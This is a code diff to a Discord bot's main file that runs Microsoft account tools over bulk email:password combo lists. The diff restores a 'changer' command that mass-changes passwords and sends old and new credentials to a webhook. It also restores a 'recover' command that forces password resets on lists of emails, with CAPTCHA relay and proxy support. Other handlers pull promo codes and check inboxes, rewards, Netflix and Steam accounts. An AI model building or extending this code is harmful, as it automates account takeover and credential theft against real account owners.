@@ -17,15 +17,11 @@ const { checkRefundAccounts } = require("./utils/microsoft-refund");
 
 const { checkInboxAccounts, getServiceCount } = require("./utils/microsoft-inbox");
 const { searchProducts, getProductDetails, purchaseItems } = require("./utils/microsoft-purchaser");
-// changer + recover modules removed per request
+const { changePasswords, checkAccounts } = require("./utils/microsoft-changer");
+const { initiateRecovery, submitCaptchaAndContinue, submitNewPassword, downloadCaptchaImage } = require("./utils/microsoft-recover");
 const { loadProxies, isProxyEnabled, getProxyCount, getProxyStats, reloadProxies } = require("./utils/proxy-manager");
 const blacklist = require("./utils/blacklist");
 const { setWlids, getWlids, getWlidCount } = require("./utils/wlid-store");
-const welcomedStore = require("./utils/welcomed-store");
-const autopilot = require("./utils/autopilot");
-const antilink = require("./utils/antilink");
-const gen = require("./utils/gen-manager");
-const { extractCombos } = require("./utils/combo-extractor");
 const {
   progressEmbed,
   checkResultsEmbed,
@@ -40,6 +36,7 @@ const {
   purchaseResultsEmbed,
   purchaseProgressEmbed,
   productSearchEmbed,
+  changerResultsEmbed,
   accountCheckerResultsEmbed,
   rewardsResultsEmbed,
   refundProgressEmbed,
@@ -62,6 +59,8 @@ const {
   adminPanelEmbed,
   detailedStatsEmbed,
   textAttachment,
+  recoverProgressEmbed,
+  recoverResultEmbed,
 } = require("./utils/embeds");
 const { checkRewardsBalances } = require("./utils/microsoft-rewards");
 const { checkNetflixAccounts } = require("./utils/netflix-checker");
@@ -87,9 +86,11 @@ let webhookUrl = "";
 // Active abort controllers per user
 const activeAborts = new Map();
 
-// (recovery sessions removed)
+// Active recovery sessions per user (for multi-step CAPTCHA flow)
+const activeRecoverySessions = new Map();
 
-// Welcome state is now persisted on disk (welcomedStore)
+// Track users who have seen the welcome message
+const welcomedUsers = new Set();
 
 // ── Helpers ──────────────────────────────────────────────────
 
@@ -100,12 +101,12 @@ function isOwner(userId) {
 // ── Channel enforcement ──────────────────────────────────────
 
 const PULLER_CHECKER_CMDS = new Set(["pull", "promopuller", "check", "checker", "claim"]);
-const INBOX_NORMAL_CMDS = new Set(["inboxaio", "rewards", "help", "stats", "search", "purchase", "wlidset", "refund", "netflix", "steam"]);
+const INBOX_NORMAL_CMDS = new Set(["inboxaio", "rewards", "recover", "captcha", "help", "stats", "search", "purchase", "changer", "wlidset", "refund", "netflix", "steam"]);
 
 function getRequiredChannel(cmd) {
   if (PULLER_CHECKER_CMDS.has(cmd)) return config.ALLOWED_CHANNEL_PULLER;
   if (INBOX_NORMAL_CMDS.has(cmd)) return config.ALLOWED_CHANNEL_INBOX;
-  return null; // admin commands work anywhere
+  return null; // admin commands (auth, deauth, admin, etc.) work in either channel
 }
 
 function checkChannelAccess(channelId, cmd) {
@@ -115,33 +116,27 @@ function checkChannelAccess(channelId, cmd) {
   return { allowed: false, requiredChannel: required };
 }
 
-function isAuthorizedAny(userId) {
-  return isOwner(userId) || auth.isAuthorized(userId) || autopilot.isGranted(userId);
-}
-
 function canUse(userId) {
   if (blacklist.isBlacklisted(userId)) return false;
-  const allowed = isAuthorizedAny(userId);
-  if (allowed) otpManager.ensureAuthenticated(userId);
+  const allowed = isOwner(userId) || auth.isAuthorized(userId);
+  if (allowed) otpManager.ensureAuthenticated(userId); // auto-session
   return allowed;
 }
 
 /**
- * First-ever-DM welcome (persisted across restarts).
- * Accepts a Discord User object directly.
+ * Send welcome embed on first command use (per session).
+ * Returns true if welcome was sent (caller should continue normally).
  */
-async function sendWelcomeIfNeeded(user) {
-  if (!user || welcomedStore.has(user.id)) return;
-  welcomedStore.add(user.id);
+async function sendWelcomeIfNeeded(respond, userId, username) {
+  if (welcomedUsers.has(userId)) return;
+  welcomedUsers.add(userId);
   try {
-    await user.send({ embeds: [welcomeEmbed(user.username)] });
+    await respond({ embeds: [welcomeEmbed(username)] });
   } catch {}
 }
 
 const MAX_COMBO_LINES = 4000;
 
-// Smart combo input: extracts email:pass from raw or "dirty" lines.
-// Falls back to plain split for non-combo data (codes, WLIDs).
 function splitInput(raw) {
   if (!raw) return [];
   return raw
@@ -150,21 +145,11 @@ function splitInput(raw) {
     .filter(Boolean);
 }
 
-function extractCombosFromText(text) {
-  return extractCombos(text, { max: MAX_COMBO_LINES });
-}
-
 async function fetchAttachmentLines(attachment) {
   if (!attachment) return [];
   const res = await fetch(attachment.url);
   const text = await res.text();
   return text.split("\n").map((l) => l.trim()).filter(Boolean);
-}
-
-async function fetchAttachmentText(attachment) {
-  if (!attachment) return "";
-  const res = await fetch(attachment.url);
-  return await res.text();
 }
 
 function stopButton(userId) {
@@ -295,12 +280,14 @@ async function handleClaim(respond, userId, accountsRaw, accountsFile, threads =
   activeAborts.set(userId, ac);
 
   try {
-    const inlineText = accountsRaw || "";
-    const fileText = accountsFile ? await fetchAttachmentText(accountsFile) : "";
-    let accounts = extractCombosFromText(inlineText + "\n" + fileText);
+    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
+    if (accountsFile) {
+      const lines = await fetchAttachmentLines(accountsFile);
+      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
+    }
 
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid email:password pairs found in your input.")] });
-    if (accounts.length > MAX_COMBO_LINES) accounts = accounts.slice(0, MAX_COMBO_LINES);
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
 
     const msg = await respond({
       embeds: [progressEmbed(0, accounts.length, "Claiming WLIDs")],
@@ -366,11 +353,14 @@ async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser = n
   const startTime = Date.now();
 
   try {
-    const inlineText = accountsRaw || "";
-    const fileText = accountsFile ? await fetchAttachmentText(accountsFile) : "";
-    let accounts = extractCombosFromText(inlineText + "\n" + fileText);
-    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid email:password pairs found in your input.")] });
-    if (accounts.length > MAX_COMBO_LINES) accounts = accounts.slice(0, MAX_COMBO_LINES);
+    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
+    if (accountsFile) {
+      const lines = await fetchAttachmentLines(accountsFile);
+      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
+    }
+
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
 
     const msg = await respond({
       embeds: [pullFetchProgressEmbed({ done: 0, total: accounts.length, totalCodes: 0, working: 0, failed: 0, withCodes: 0, noCodes: 0, startTime, username })],
@@ -466,10 +456,7 @@ async function handlePull(respond, userId, accountsRaw, accountsFile, dmUser = n
     const invalid = validateResults.filter((r) => r.status === "invalid" || r.status === "error");
 
     if (valid.length > 0)
-      files.push(textAttachment(valid.map((r) => {
-        const base = r.title ? `${r.code} | ${r.title}` : r.code;
-        return r.source ? `${base} | from ${r.source}` : base;
-      }), "valid.txt"));
+      files.push(textAttachment(valid.map((r) => (r.title ? `${r.code} | ${r.title}` : r.code)), "valid.txt"));
     if (used.length > 0)
       files.push(textAttachment(used.map((r) => r.code), "used.txt"));
     if (expired.length > 0)
@@ -956,8 +943,93 @@ async function handleSearch(respond, query) {
   return respond({ embeds: [productSearchEmbed(results.slice(0, 10))] });
 }
 
-// ── Changer handler removed ──────────────────────────────────
+// ── Changer handler ──────────────────────────────────────────
 
+async function handleChanger(respond, userId, accountsRaw, accountsFile, newPassword, threads = 5, dmUser = null) {
+  if (!isOwner(userId)) return respond({ embeds: [ownerOnlyEmbed("Changer")] });
+
+  const acquire = limiter.acquire(userId, "changer");
+  if (!acquire.ok) {
+    const reason = acquire.reason === "busy"
+      ? "You already have a command running. Wait for it to finish."
+      : `Max concurrent users (${config.MAX_CONCURRENT_USERS}) reached. Try again later.`;
+    return respond({ embeds: [errorEmbed(reason)] });
+  }
+
+  const ac = new AbortController();
+  activeAborts.set(userId, ac);
+
+  try {
+    let accounts = splitInput(accountsRaw).filter((a) => a.includes(":"));
+    if (accountsFile) {
+      const lines = await fetchAttachmentLines(accountsFile);
+      accounts = accounts.concat(lines.filter((l) => l.includes(":")));
+    }
+
+    if (accounts.length === 0) return respond({ embeds: [errorEmbed("No valid accounts provided (email:password format).")] });
+    if (accounts.length > MAX_COMBO_LINES) return respond({ embeds: [errorEmbed(`Too many accounts. Max ${MAX_COMBO_LINES} lines allowed.`)] });
+    if (!newPassword) return respond({ embeds: [errorEmbed("No new password provided.")] });
+    if (newPassword.length < 8) return respond({ embeds: [errorEmbed("New password must be at least 8 characters.")] });
+
+    const msg = await respond({
+      embeds: [progressEmbed(0, accounts.length, "Changing passwords")],
+      components: [stopButton(userId)],
+      fetchReply: true,
+    });
+
+    let lastUpdate = Date.now();
+    const results = await changePasswords(accounts, newPassword, threads, (done, total) => {
+      const now = Date.now();
+      if (now - lastUpdate > 2000) {
+        lastUpdate = now;
+        updateProgress(msg, progressEmbed(done, total, "Changing passwords"), userId);
+      }
+    }, ac.signal);
+
+    const stopped = ac.signal.aborted;
+    const files = [];
+    const success = results.filter(r => r.success);
+    const failed = results.filter(r => !r.success);
+
+    if (success.length > 0)
+      files.push(textAttachment(success.map(r => `${r.email}:${r.newPassword}`), "changed.txt"));
+    if (failed.length > 0)
+      files.push(textAttachment(failed.map(r => `${r.email}: ${r.error || "Failed"}`), "failed.txt"));
+
+    const embed = changerResultsEmbed(results);
+    if (stopped) embed.setTitle("Changer Results (Stopped)");
+
+    // Send successful changes to webhook + record stats
+    for (const r of success) {
+      statsManager.record(userId, "changer", true);
+      sendToWebhook(webhookUrl, {
+        email: r.email,
+        oldPassword: r.oldPassword || "N/A",
+        newPassword: r.newPassword,
+        userId,
+      });
+    }
+    for (const r of failed) {
+      statsManager.record(userId, "changer", false);
+    }
+
+    if (dmUser) {
+      try {
+        await dmUser.send({ embeds: [embed], files });
+        await msg.edit({ embeds: [infoEmbed("Changer Complete", "Results sent to your DMs.")], components: [] });
+      } catch {
+        await msg.edit({ embeds: [embed], files, components: [] });
+      }
+    } else {
+      await msg.edit({ embeds: [embed], files, components: [] });
+    }
+  } catch (err) {
+    await respond({ embeds: [errorEmbed(`Unexpected error: ${err.message}`)] });
+  } finally {
+    activeAborts.delete(userId);
+    limiter.release(userId);
+  }
+}
 
 // ── Account checker handler ──────────────────────────────────
 
@@ -1066,8 +1138,195 @@ async function handleBotStats(respond, callerId) {
   return respond({ embeds: [detailedStatsEmbed(stats, topUsers)] });
 }
 
-// ── Recovery / Captcha handlers removed ──────────────────────
+// ── Account Recovery Handler ─────────────────────────────────
 
+async function recoverSingleEmail(email, newPassword, userId) {
+  const result = await initiateRecovery(email);
+  if (!result.success) {
+    return { email, success: false, error: result.error };
+  }
+  if (result.phase === "password_reset") {
+    const pwResult = await submitNewPassword(result, newPassword);
+    statsManager.record(userId, "recover", !!pwResult.success);
+    return { email, success: pwResult.success, message: pwResult.success ? pwResult.message : pwResult.error };
+  }
+  if (result.phase === "captcha_required") {
+    return { email, success: false, error: `CAPTCHA required (${result.captchaInfo.type || "unknown"}) — skipped in bulk mode`, skipped: true, session: result };
+  }
+  if (result.phase === "verify_identity") {
+    return { email, success: false, error: "Identity verification required — skipped", skipped: true };
+  }
+  return { email, success: false, error: `Unexpected phase: ${result.phase}` };
+}
+
+async function handleRecover(respond, userId, emailsRaw, emailsFile, newPassword, threads, dmUser, interaction, message) {
+  if (!isOwner(userId) && !auth.isAuthorized(userId)) {
+    return respond({ embeds: [errorEmbed("Not authorized. Ask the owner to run `/auth`.")] });
+  }
+  if (blacklist.isBlacklisted(userId)) {
+    return respond({ embeds: [errorEmbed("You are blacklisted.")] });
+  }
+  if (!newPassword) {
+    return respond({ embeds: [errorEmbed("Provide the new password to set.")] });
+  }
+
+  // Collect emails from input + file
+  let emails = splitInput(emailsRaw)
+    .map((e) => e.trim().toLowerCase())
+    .map((e) => (e.includes(":") ? e.split(":")[0].trim() : e))
+    .filter((e) => e.includes("@") && !e.includes(" "));
+  if (emailsFile) {
+    const lines = await fetchAttachmentLines(emailsFile);
+    emails = emails.concat(
+      lines
+        .map((l) => l.trim().toLowerCase())
+        .map((l) => (l.includes(":") ? l.split(":")[0].trim() : l))
+        .filter((l) => l.includes("@") && !l.includes(" "))
+    );
+  }
+
+  emails = [...new Set(emails)];
+
+  if (emails.length === 0) {
+    return respond({ embeds: [errorEmbed("No emails provided. Provide email(s) or attach a `.txt` file.")] });
+  }
+  if (emails.length > MAX_COMBO_LINES) {
+    return respond({ embeds: [errorEmbed(`Too many emails. Max ${MAX_COMBO_LINES} lines allowed.`)] });
+  }
+
+  // Single email — original interactive flow (supports CAPTCHA)
+  if (emails.length === 1) {
+    const email = emails[0];
+    await respond({ embeds: [recoverProgressEmbed(email, "Initiating recovery...")] });
+
+    const result = await initiateRecovery(email);
+
+    if (!result.success) {
+      return respond({ embeds: [recoverResultEmbed(email, false, result.error)] });
+    }
+
+    if (result.phase === "password_reset") {
+      const pwResult = await submitNewPassword(result, newPassword);
+      statsManager.record(userId, "recover", !!pwResult.success);
+      return respond({ embeds: [recoverResultEmbed(email, pwResult.success, pwResult.success ? pwResult.message : pwResult.error)] });
+    }
+
+    if (result.phase === "captcha_required") {
+      activeRecoverySessions.set(userId, { ...result, newPassword });
+      const captchaType = result.captchaInfo.type || "unknown";
+      let captchaMsg = `CAPTCHA required (type: \`${captchaType}\`).\n\n`;
+      if (result.captchaInfo.type === "hip" && result.captchaInfo.imageUrl) {
+        const imgBuffer = await downloadCaptchaImage(result.captchaInfo.imageUrl, result.cookieJar);
+        if (imgBuffer) {
+          const { AttachmentBuilder } = require("discord.js");
+          const att = new AttachmentBuilder(imgBuffer, { name: "captcha.png" });
+          captchaMsg += "Solve the CAPTCHA below and reply with:\n`/captcha <solution>`\nor `.captcha <solution>`";
+          return respond({ embeds: [recoverProgressEmbed(email, captchaMsg)], files: [att] });
+        }
+      }
+      if (result.captchaInfo.type === "funcaptcha") {
+        captchaMsg += `FunCaptcha site key: \`${result.captchaInfo.siteKey || "N/A"}\`\nPage URL: \`${result.pageUrl}\`\n\n`;
+        captchaMsg += "Solve externally, then: `/captcha <token>`";
+      } else {
+        captchaMsg += "Solve externally, then: `/captcha <solution>`";
+      }
+      return respond({ embeds: [recoverProgressEmbed(email, captchaMsg)] });
+    }
+
+    if (result.phase === "verify_identity") {
+      const options = result.verifyInfo.options.map((o) => `\`${o.index}\`: ${o.label}`).join("\n");
+      return respond({ embeds: [recoverProgressEmbed(email, `Identity verification required.\n\nOptions:\n${options}\n\nNot yet automated.`)] });
+    }
+
+    return respond({ embeds: [recoverResultEmbed(email, false, `Unexpected phase: ${result.phase}`)] });
+  }
+
+  // Bulk mode
+  const concurrency = Math.min(threads || 1, 10);
+  const msg = await respond({ embeds: [recoverProgressEmbed(`${emails.length} emails`, `Starting bulk recovery (${concurrency} threads)...`)] });
+  const editMsg = (opts) => { try { if (msg?.edit) msg.edit(opts); else respond(opts); } catch {} };
+
+  const results = [];
+  let completed = 0;
+
+  // Process in batches
+  for (let i = 0; i < emails.length; i += concurrency) {
+    const batch = emails.slice(i, i + concurrency);
+    const batchResults = await Promise.all(
+      batch.map(email => recoverSingleEmail(email, newPassword, userId))
+    );
+    results.push(...batchResults);
+    completed += batch.length;
+
+    // Update progress
+    const pct = Math.round((completed / emails.length) * 100);
+    const success = results.filter(r => r.success).length;
+    const failed = results.filter(r => !r.success && !r.skipped).length;
+    const skipped = results.filter(r => r.skipped).length;
+    editMsg({ embeds: [recoverProgressEmbed(
+      `${emails.length} emails`,
+      `Progress: ${completed}/${emails.length} (${pct}%)\nSuccess: ${success} | Failed: ${failed} | Skipped (CAPTCHA): ${skipped}`
+    )] });
+  }
+
+  // Build final results
+  const success = results.filter(r => r.success);
+  const failed = results.filter(r => !r.success && !r.skipped);
+  const skipped = results.filter(r => r.skipped);
+
+  const files = [];
+  if (success.length > 0)
+    files.push(textAttachment(success.map(r => `${r.email} | ${r.message || "OK"}`), "recovered.txt"));
+  if (failed.length > 0)
+    files.push(textAttachment(failed.map(r => `${r.email} | ${r.error || "Failed"}`), "failed.txt"));
+  if (skipped.length > 0)
+    files.push(textAttachment(skipped.map(r => `${r.email} | ${r.error}`), "skipped.txt"));
+
+  const embed = recoverResultEmbed(
+    `${emails.length} emails`,
+    success.length > 0,
+    `Recovered: ${success.length} | Failed: ${failed.length} | Skipped: ${skipped.length}`
+  );
+
+  const finalOpts = { embeds: [embed], files };
+  editMsg(finalOpts);
+
+  if (dmUser) {
+    try { await dmUser.send(finalOpts); } catch {}
+  }
+}
+
+async function handleCaptchaSolve(respond, userId, solution) {
+  const session = activeRecoverySessions.get(userId);
+  if (!session) {
+    return respond({ embeds: [errorEmbed("No active recovery session. Start one with `/recover` first.")] });
+  }
+
+  await respond({ embeds: [recoverProgressEmbed(session.email, "Submitting CAPTCHA solution...")] });
+
+  const result = await submitCaptchaAndContinue(session, solution);
+
+  if (!result.success) {
+    activeRecoverySessions.delete(userId);
+    return respond({ embeds: [recoverResultEmbed(session.email, false, result.error)] });
+  }
+
+  if (result.phase === "password_reset") {
+    const pwResult = await submitNewPassword(result, session.newPassword);
+    activeRecoverySessions.delete(userId);
+    statsManager.record(userId, "recover", !!pwResult.success);
+    return respond({ embeds: [recoverResultEmbed(session.email, pwResult.success, pwResult.success ? pwResult.message : pwResult.error)] });
+  }
+
+  if (result.phase === "captcha_required") {
+    // Another CAPTCHA — update session
+    activeRecoverySessions.set(userId, { ...result, email: session.email, newPassword: session.newPassword });
+    return respond({ embeds: [recoverProgressEmbed(session.email, "Another CAPTCHA required. Solve and reply with `/captcha <solution>` again.")] });
+  }
+
+  activeRecoverySessions.delete(userId);
+  return respond({ embeds: [recoverResultEmbed(session.email, false, `Unexpected result (phase: ${result.phase})`)] });
+}
 
 // ── Rewards handler ─────────────────────────────────────────
 
@@ -1148,7 +1407,7 @@ async function handleRewards(respond, userId, accountsRaw, accountsFile, threads
 
 // ── Inbox AIO handler ────────────────────────────────────────
 
-async function handleInboxAio(respond, userId, accountsRaw, accountsFile, threads = 3, dmUser = null) {
+async function handleInboxAio(respond, userId, accountsRaw, accountsFile, threads = 5, dmUser = null) {
   if (!canUse(userId)) return respond({ embeds: [errorEmbed(blacklist.isBlacklisted(userId) ? "You are blacklisted." : "You are not authorized to use this bot.")] });
 
   const acquire = limiter.acquire(userId, "inboxaio");
@@ -1568,8 +1827,9 @@ client.on("interactionCreate", async (interaction) => {
   };
 
   // Send welcome on first use (to DMs)
-  await sendWelcomeIfNeeded(user);
-
+  await sendWelcomeIfNeeded(async (opts) => {
+    try { await user.send(opts); } catch {}
+  }, user.id, user.username);
 
   try {
     if (commandName === "check") {
@@ -1607,7 +1867,7 @@ client.on("interactionCreate", async (interaction) => {
       await interaction.deferReply();
       const accounts = interaction.options.getString("accounts");
       const accountsFile = interaction.options.getAttachment("accounts_file");
-      const threads = interaction.options.getInteger("threads") || 3;
+      const threads = interaction.options.getInteger("threads") || 5;
       await handleInboxAio(respond, user.id, accounts, accountsFile, threads, user);
     }
 
@@ -1665,8 +1925,14 @@ client.on("interactionCreate", async (interaction) => {
       await handleSearch(respond, query);
     }
 
-    // changer command removed
-
+    else if (commandName === "changer") {
+      await interaction.deferReply();
+      const accounts = interaction.options.getString("accounts");
+      const accountsFile = interaction.options.getAttachment("accounts_file");
+      const newPassword = interaction.options.getString("new_password");
+      const threads = interaction.options.getInteger("threads") || 5;
+      await handleChanger(respond, user.id, accounts, accountsFile, newPassword, threads, user);
+    }
 
     else if (commandName === "checker") {
       await interaction.deferReply();
@@ -1713,8 +1979,20 @@ client.on("interactionCreate", async (interaction) => {
     }
 
 
-    // recover + captcha commands removed
+    else if (commandName === "recover") {
+      await interaction.deferReply();
+      const emailsRaw = interaction.options.getString("emails");
+      const emailsFile = interaction.options.getAttachment("emails_file");
+      const newPassword = interaction.options.getString("new_password");
+      const threads = interaction.options.getInteger("threads") || 1;
+      await handleRecover(respond, user.id, emailsRaw, emailsFile, newPassword, threads, user, interaction);
+    }
 
+    else if (commandName === "captcha") {
+      await interaction.deferReply();
+      const solution = interaction.options.getString("solution");
+      await handleCaptchaSolve(respond, user.id, solution);
+    }
 
     // ── Admin commands ──
     else if (commandName === "admin") {
@@ -1739,58 +2017,6 @@ client.on("interactionCreate", async (interaction) => {
 
 client.on("messageCreate", async (message) => {
   if (message.author.bot) return;
-
-  // ── Anti-link guard (channel-scoped) ──
-  try {
-    if (
-      message.channelId === antilink.ANTI_LINK_CHANNEL_ID &&
-      !isOwner(message.author.id) &&
-      !antilink.isWhitelisted(message.author.id) &&
-      antilink.containsLink(message.content)
-    ) {
-      try { await message.delete(); } catch {}
-      try {
-        const warn = await message.channel.send({
-          embeds: [errorEmbed(`<@${message.author.id}>, links are not allowed in this channel.`)],
-        });
-        setTimeout(() => warn.delete().catch(() => {}), 5000);
-      } catch {}
-      return;
-    }
-  } catch {}
-
-  // ── Autopilot "milk" trigger (bot channels, case-insensitive) ──
-  try {
-    const isBotChannel =
-      message.channelId === config.ALLOWED_CHANNEL_PULLER ||
-      message.channelId === config.ALLOWED_CHANNEL_INBOX;
-    const trimmed = (message.content || "").trim().toLowerCase();
-    if (
-      isBotChannel &&
-      autopilot.isEnabled() &&
-      !message.content.startsWith(config.PREFIX)
-    ) {
-      const uid = message.author.id;
-      const alreadyOk = isOwner(uid) || auth.isAuthorized(uid) || autopilot.isGranted(uid);
-
-      if (trimmed === "milk" && !alreadyOk) {
-        const exp = autopilot.grant(uid);
-        autopilot.clearPrompted(uid);
-        try { await message.author.send({ embeds: [successEmbed(`Access granted for 10 days. Expires <t:${Math.floor(exp / 1000)}:R>.`)] }); } catch {}
-        try { await message.reply({ embeds: [successEmbed("Access granted (10 days). Check your DMs.")] }); } catch {}
-        return;
-      }
-
-      // Prompt unauthorized users once
-      if (!alreadyOk && !autopilot.wasPrompted(uid) && trimmed.length > 0 && trimmed !== "milk") {
-        autopilot.markPrompted(uid);
-        try {
-          await message.reply({ embeds: [infoEmbed("Access required", "Reply with `milk` to unlock 10 days of bot access.")] });
-        } catch {}
-      }
-    }
-  } catch {}
-
   if (!message.content.startsWith(config.PREFIX)) return;
 
 
@@ -1808,8 +2034,9 @@ client.on("messageCreate", async (message) => {
 
   const respond = (opts) => message.reply(opts);
   // Send welcome on first use
-  await sendWelcomeIfNeeded(message.author);
-
+  await sendWelcomeIfNeeded(async (opts) => {
+    try { await message.author.send(opts); } catch {}
+  }, message.author.id, message.author.username);
 
   try {
     if (cmd === "check") {
@@ -1930,8 +2157,15 @@ client.on("messageCreate", async (message) => {
       await handleSearch(respond, query);
     }
 
-    // .changer removed
-
+    else if (cmd === "changer") {
+      const newPassword = args.pop();
+      const accountsRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!newPassword && !attachment) {
+        return respond({ embeds: [infoEmbed("Usage", "`.changer <accounts> <new_password>`\nProvide email:password accounts and the new password.\nResults are always sent to your DMs.")] });
+      }
+      await handleChanger(respond, message.author.id, accountsRaw, attachment, newPassword, 5, message.author);
+    }
 
     else if (cmd === "checker") {
       const accountsRaw = args.join(" ");
@@ -1983,8 +2217,26 @@ client.on("messageCreate", async (message) => {
     }
 
 
-    // .recover and .captcha removed
+    else if (cmd === "recover") {
+      const newPassword = args.pop();
+      const emailsRaw = args.join(" ");
+      const attachment = message.attachments.first();
+      if (!emailsRaw && !attachment) {
+        return respond({ embeds: [infoEmbed("Usage", "`.recover <email(s)> <new_password>`\nProvide email(s) or attach a `.txt` file.\nResults are always sent to your DMs.")] });
+      }
+      if (!newPassword) {
+        return respond({ embeds: [errorEmbed("Provide the new password as the last argument.")] });
+      }
+      await handleRecover(respond, message.author.id, emailsRaw, attachment, newPassword, 1, message.author, null, message);
+    }
 
+    else if (cmd === "captcha") {
+      const solution = args.join(" ");
+      if (!solution) {
+        return respond({ embeds: [infoEmbed("Usage", "`.captcha <solution>`\n\nSubmit the CAPTCHA solution for an active recovery session.")] });
+      }
+      await handleCaptchaSolve(respond, message.author.id, solution);
+    }
 
     // ── Admin commands (prefix) ──
     else if (cmd === "admin") {
@@ -2000,178 +2252,6 @@ client.on("messageCreate", async (message) => {
     else if (cmd === "botstats") {
       await handleBotStats(respond, message.author.id);
     }
-
-    // ── Owner utility: .say <text> ──
-    else if (cmd === "say") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".say")] });
-      const text = args.join(" ").trim();
-      if (!text) return respond({ embeds: [infoEmbed("Usage", "`.say <message>` — bot will repeat your message in this channel.")] });
-      try { await message.delete(); } catch {}
-      try { await message.channel.send(text); } catch {}
-    }
-
-    // ── Owner utility: .dm <userId> <text> ──
-    else if (cmd === "dm") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".dm")] });
-      const targetId = args.shift();
-      const text = args.join(" ").trim();
-      if (!targetId || !text) return respond({ embeds: [infoEmbed("Usage", "`.dm <userId> <message>` — DMs the user as the bot.")] });
-      try {
-        const target = await client.users.fetch(targetId);
-        await target.send(text);
-        return respond({ embeds: [successEmbed(`DM sent to <@${targetId}>.`)] });
-      } catch (e) {
-        return respond({ embeds: [errorEmbed(`Could not DM ${targetId}: ${e.message}`)] });
-      }
-    }
-
-    // ── Autopilot admin ──
-    else if (cmd === "autopilotoff") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".autopilotoff")] });
-      autopilot.setEnabled(false);
-      return respond({ embeds: [successEmbed("Autopilot system disabled. The 'milk' trigger is OFF.")] });
-    }
-    else if (cmd === "autopiloton") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".autopiloton")] });
-      autopilot.setEnabled(true);
-      return respond({ embeds: [successEmbed("Autopilot system enabled.")] });
-    }
-    else if (cmd === "autopilotgrants") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".autopilotgrants")] });
-      const list = autopilot.listGrants();
-      if (list.length === 0) return respond({ embeds: [infoEmbed("Autopilot grants", "No active grants.")] });
-      const lines = list
-        .sort((a, b) => a.expiresAt - b.expiresAt)
-        .map(g => `<@${g.userId}> — expires <t:${Math.floor(g.expiresAt / 1000)}:R>`);
-      return respond({ embeds: [infoEmbed(`Autopilot grants (${list.length})`, lines.join("\n").slice(0, 3900))] });
-    }
-    else if (cmd === "autopilotcheck") {
-      const targetId = args[0] || message.author.id;
-      const exp = autopilot.getExpiry(targetId);
-      if (!exp) return respond({ embeds: [infoEmbed("Autopilot", `<@${targetId}> has no autopilot grant.`)] });
-      return respond({ embeds: [infoEmbed("Autopilot", `<@${targetId}> expires <t:${Math.floor(exp / 1000)}:R>.`)] });
-    }
-
-    // ── Anti-link admin ──
-    else if (cmd === "antilinkadd") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".antilinkadd")] });
-      const id = (args[0] || "").replace(/[<@!>]/g, "");
-      if (!id) return respond({ embeds: [infoEmbed("Usage", "`.antilinkadd <userId>` — bypass anti-link for this user.")] });
-      antilink.addWhitelist(id);
-      return respond({ embeds: [successEmbed(`Added <@${id}> to anti-link whitelist.`)] });
-    }
-    else if (cmd === "antilinkremove") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".antilinkremove")] });
-      const id = (args[0] || "").replace(/[<@!>]/g, "");
-      if (!id) return respond({ embeds: [infoEmbed("Usage", "`.antilinkremove <userId>`")] });
-      const had = antilink.removeWhitelist(id);
-      return respond({ embeds: [had ? successEmbed(`Removed <@${id}>.`) : errorEmbed("Not in whitelist.")] });
-    }
-    else if (cmd === "antilinklist") {
-      if (!isOwner(message.author.id)) return respond({ embeds: [ownerOnlyEmbed(".antilinklist")] });
-      const list = antilink.listWhitelist();
-      if (list.length === 0) return respond({ embeds: [infoEmbed("Anti-link whitelist", "Empty.")] });
-      return respond({ embeds: [infoEmbed(`Whitelist (${list.length})`, list.map(id => `<@${id}>`).join("\n"))] });
-    }
-
-    // ── Gen system (mirrors Python gen_manager) ──
-    else if (cmd === "gen") {
-      const category = args[0];
-      if (!category) {
-        const cats = gen.getCategories();
-        const counts = gen.allStockCounts();
-        const list = cats.length === 0
-          ? "No categories yet. Owner can add via `.gencatadd <name>`."
-          : cats.map(c => `**${c}** — ${counts[c] || 0} in stock`).join("\n");
-        return respond({ embeds: [infoEmbed("Gen — pick a category", `Usage: \`.gen <category>\`\n\n${list}`)] });
-      }
-      if (!isAuthorizedAny(message.author.id)) {
-        return respond({ embeds: [errorEmbed("You are not authorized. Reply `milk` in a bot channel for 10-day access.")] });
-      }
-      const result = gen.generate(message.author.id, category);
-      if (result.error === "no_category") return respond({ embeds: [errorEmbed(`Category not found: \`${category}\``)] });
-      if (result.error === "limit") return respond({ embeds: [errorEmbed(`Daily limit reached. Limit: ${result.limit}, used: ${result.used}.`)] });
-      if (result.error === "empty") return respond({ embeds: [errorEmbed(`Stock empty for \`${category}\`. Ask the owner to refill.`)] });
-      try {
-        await message.author.send({
-          embeds: [successEmbed(`**${category}** account:\n\`\`\`\n${result.item}\n\`\`\`\nRemaining today: ${result.left}`)],
-        });
-        return respond({ embeds: [successEmbed(`Sent in DMs. Remaining today: ${result.left}.`)] });
-      } catch {
-        return respond({ embeds: [errorEmbed("Could not DM you. Open your DMs and try again.")] });
-      }
-    }
-
-    else if (cmd === "stock") {
-      const counts = gen.allStockCounts();
-      const cats = gen.getCategories();
-      if (cats.length === 0) return respond({ embeds: [infoEmbed("Stock", "No categories.")] });
